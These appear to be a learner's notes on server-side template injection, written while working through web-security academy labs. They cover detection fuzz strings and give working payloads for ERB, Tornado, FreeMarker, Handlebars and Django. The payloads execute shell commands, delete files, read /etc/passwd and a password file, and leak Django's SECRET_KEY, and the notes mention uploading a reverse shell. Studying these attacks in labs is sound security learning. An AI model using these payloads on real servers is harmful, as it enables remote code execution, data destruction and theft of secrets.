# ssti
# server-side template injection

an attacker is able to use native template syntax to inject a malicious payload
into a template, which is then executed server-side.

the term *objects* refers to data structures or entities that can be accessed
and manipulated within the template engine.

Template engines are designed to generate web pages by combining fixed
templates with volatile data.

vulnerabilities arise when user input is concatenated into templates rather
than being passed in as data.

getting the name
`http://vulnerable-website.com/?name={{bad-stuff-here}}`

adding `name` variable's value to the email, which is vulnerable to ssti
`$output = $twig->render("Dear " . $_GET['name']);`

## detection

fuzzing the template by injecting a sequence of special characters commonly
used in template expressions:

`
${{<%[%'"}}%\
`

If an exception is raised, this indicates that the injected template syntax is
potentially being interpreted by the server in some way, a sign of a potential
vulnerability.

### plaintext context

you can add input by using HTML tags or template's native syntax in most
Template languages, which will be rendered to HTML on the server; e.g.
`render(’Hello ' + username)` -> `Hello Carlos`

`http://vulnerable-website.com/?username=${7*7}`

if the result in `Hello 49`, the mathematical operation is being evaluated server-side.
this is a proof of concept for ssti.

### code context

Vulnerability by placing user input within a template expression.

`
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)
`

the resulting url on the website: `http://vulnerable-website.com/?greeting=data.username`
and could be output to `Hello Carlos`.

### identify

submitting invalid syntax is often enough because the resulting error message will tell you exactly what the template engine is

Otherwise, you'll need to manually test different language-specific payloads and study how they are interpreted by the template engine.

### the basic template syntax

read the documentations, search for code execution sections

## Basic server-side template injection, EBB ruby template

check if the input evaluates a mathematical expression:

`<%= 7*7 %>`

`https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>`

`system()` executes the argument.

## code context, tornado template

check for what would happen if you change different parts of the user settings.

if you change the username, it will change in the comment sections too, it you
inject an injection payload, it will be evaluated in the comment section.

`user.first_name}}{{7*7` trying it like this, will escape the extra stuff.

how to execute code:
`blog-post-author-display=user.first_name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')`

## Server-side template injection using documentation

search for anything that could be related to security vulnerabilities.

if there is some input opportunity, try to trigger an error to get more info.

`new()` is a security concern because it can be used to create arbitrary Java objects that implement the `TemplateModel` interface.
there is a class called Execute in `TemplateModel`.

so: `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }`

## Server-side template injection in an unknown language with a documented exploit

injecting a fuzz string containing template syntax from various different template languages, such as 
`
${{<%[%'"}}%\
`
helps to get somewhere (e.g. cause an error to find out the template engine).

then you should search the web to find known exploits

this is a template, running node.js code, so you wouldn't find the code in the template's website.
`{{this.push "return require('child_process').exec('whoami');"}}`

## explore

template engines expos a "self" or "environment" object. which acts like a
namespace containing all objects, methods, and attributes that are supported by
the template engine.

use it to generate a list of objects that are in scope: `${T(java.lang.System).getenv()}`

## dev supplied objects

websites will contain both built-in objects provided by the template and
custom, site-specific objects that have been supplied by the web developer.

study an object's behavior in the context of each distinct template.

use the generic input:
`
${{<%[%'"}}%\
`

`django` debug builtin:

running `{% debug %}`:

` {'product': {'name': 'Grow Your Own Spy Kit', 'price': '$12.78', 'stock': 520},
 'settings': <LazySettings "None">}{'False': False, 'None': None, 'True': True}
`

searching in Django's docs, we find a property for settings: `{{settings.SECRET_KEY}}`

## Constructing a custom exploit using an object chain

find objects and methods
investigate the documents
find interesting ones; methods they access to and objects they return
more docs; find objects and methods to chain together

`getclass()` is available on all objects

`${product.getClass}`
returns: `class lab.actions.templateengines.FreeMarkerProduct`

found an interesting method in `Class` object.
`{product.getClass.getProtectionDomain}`

and continue this ...

payload: `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`

## Constructing a custom exploit using developer-supplied objects

developer-created objects that are exposed to the template can offer a further,
less battle-hardened attack surface.

site-specific objects are almost certainly not documented at all

investigate the website's behavior manually to identify the attack surface and
construct your own custom exploit accordingly.

experiencing website's functionality, I uploaded a reverse shell, and got this:
`
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/shell.php', 'application/x-p...')
#1 {main}
  thrown in /home/carlos/User.php on line 28
`

* the function `user.setAvatar()` validates and sets the image.
* `application/x-php` indicates that it's a PHP script.

use the function to access a file on the server:
`blog-post-author-display=user.setAvatar("/etc/passwd", "image/jpg")`

then get the other file found earlier:
`blog-post-author-display=user.setAvatar("/home/carlos/User.php", "image/jpg")`

there is a method to delete the avatar, so we can first point the avatar to that file, then call that method using `user.<method>`
